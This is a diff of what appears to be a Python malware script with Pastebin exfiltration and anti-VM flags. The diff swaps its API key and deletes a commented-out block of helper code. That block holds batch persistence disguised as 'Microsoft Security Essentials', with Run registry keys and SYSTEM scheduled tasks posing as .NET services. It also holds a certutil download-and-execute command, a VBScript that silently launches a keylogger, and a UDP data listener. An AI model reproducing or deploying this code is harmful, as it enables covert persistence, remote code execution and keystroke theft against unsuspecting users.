@@ -23,7 +23,7 @@ Debug = False
 DBG   = False
 VM    = False
 
-pbin  = PastebinPython(api_dev_key='feab72ec4bfc99b4e7b611055c7e970f') 
+pbin  = PastebinPython(api_dev_key='feab72ec4bfa99b4e7b611055c7e970d') # Throwaway key
 
 name     = sys.argv[0]
 location = os.abspath(name)
@@ -398,57 +398,3 @@ if __name__ == "__main__":
 		# To find indicators, not that we are 100% safe.
 		start()
 
-
-"""
-'''
-certutil -decode encoded_attack.crt encoded.exe
-'''
-
-# Helper Scripts
-def SelfDestruct(which=''):
-
-	task  = "REM Microsoft(tm) --- Security Essentials"
-	task += "@ECHO OFF"
-	task += ""
-	task += "mkdir %TEMP%\mcache"
-	task += "mkdir %APPDATA%\WinHelper"
-	task += ""
-	task += REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%TEMP%\mcache\' + name
-	task += REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%APPDATA%\WinHelper\{0}' + name
-	task += ""
-	task += "schtasks /create /tn 'Windows .NET Services' /tr %TEMP%\mcache\{0} /sc onstart /ru System".format
-	task += "schtasks /create /tn 'Windows .NET Services' /tr %APPDATA%\WinHelper\{0} /sc onstart /ru System".format
-
-
-	crt  = "REM Microsoft(tm) --- Security Essentials"
-	crt += "@ECHO OFF"
-	crt += "certutil -urlcache -split -f {0} data0.bat && start /b cmd.exe /c data0.bat".format(link)
-	crt += "certutil -decode encoded_attack.crt encoded.exe"
-
-
-
-Set WshShell = WScript.CreateObject("WScript.Shell")
-WshShell.Run ("C:\Users\jny\Desktop\Keylogger\logger.exe"), 0, False
-
-Set WshShell = Nothing
-
-
-# %windir%\System32
-
-
-# -*- coding:utf-8 -*-
-
-import socket,thread
-
-address = ('127.0.0.1', 1234)
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.bind(address)
-def log_data(data):
-    print data
-while True:
-    data, addr = s.recvfrom(1024)
-    thread.start_new_thread(log_data, (data,))
-
-
-s.close()
-"""
